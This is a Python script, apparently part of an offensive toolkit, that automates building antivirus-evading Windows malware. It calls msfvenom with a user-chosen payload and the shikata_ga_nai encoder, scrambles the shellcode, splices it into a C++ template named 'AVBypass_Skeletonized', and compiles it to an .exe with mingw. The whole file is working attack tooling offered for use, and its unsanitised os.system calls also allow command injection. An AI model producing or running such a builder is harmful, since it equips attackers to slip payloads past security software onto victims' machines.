#!/usr/bin/env python3

"""
    Author: Jake Homberg
    FileName: GenFile.py
    Purpose: This file serves as a wrapper to accomplish the following:
    1- Using the arguments, get the output of scramblePayload.py
    2- Using the arguments, merge the contents of skeleton.cpp and the
        output from scramblePayload.py
    3- Compile them for use on Windows using mingw and g++
"""

# Import Block
import os
import argparse

# Set up argparser
parser = argparse.ArgumentParser()
parser.add_argument("-vn", help="Set the variable name for the generated code")
parser.add_argument("-c", help="Set the chunkSize. Try to keep it below 7")
parser.add_argument("-args", help="Payload and options for msfvenom. NOTE: use \\ before quotes")
args = parser.parse_args()

# Check for the necessary files and folders.
if not os.path.isfile("./scramblePayload.py"):
    exit()

if not os.path.isfile("./AVBypass_Skeletonized.cpp"):
    exit()

if not os.path.isdir("./output"):
    os.system("mkdir output")

else:
    if os.path.isfile("./output/payload.txt"):
        os.system("mv ./output/payload.txt ./output/payload.txt.bak")


varName = args.vn

# Get contents of the scramblePayload.py script to an output file (So we can go back and inspect later if desired)
os.system("msfvenom "+ args.args + " -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\" 2>/dev/null -f hex | ./scramblePayload.py -c " + args.c + " -vn " + varName + " >./output/payload.txt")

# Ensure there is a file to write to
os.system("echo  >./output/compile.cpp")

# Open files for reading and writing
with open("./output/compile.cpp", 'r+') as compilecpp:
    with open("./AVBypass_Skeletonized.cpp") as template:
        for line in template:
            if ('//INSERTHERE' not in line):
                compilecpp.write(line.replace('PAYLOADNAME', varName))
            else:
                with open("./output/payload.txt") as scrambled:
                    for line in scrambled:
                        compilecpp.write('\t' +line)

# Compile the finished file
os.system("i686-w64-mingw32-g++ -static-libstdc++ -static-libgcc output/compile.cpp -o output/compiled.exe")


